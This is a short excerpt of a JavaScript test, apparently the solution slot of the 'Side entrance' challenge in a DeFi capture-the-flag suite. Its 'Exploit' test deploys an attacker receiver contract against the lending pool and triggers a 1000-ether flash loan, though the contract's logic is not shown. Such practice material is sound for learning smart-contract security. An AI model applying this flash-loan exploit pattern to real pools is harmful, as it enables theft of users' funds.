...
describe('[Challenge] Side entrance', function () {
    ...
    it('Exploit', async function () {
        ...
        this.flashLoanEtherReceiver = await FlashLoanEtherReceiverFactory.deploy(this.pool.address);
        await this.flashLoanEtherReceiver.executeFlashLoan(ethers.utils.parseEther('1000'));
    });
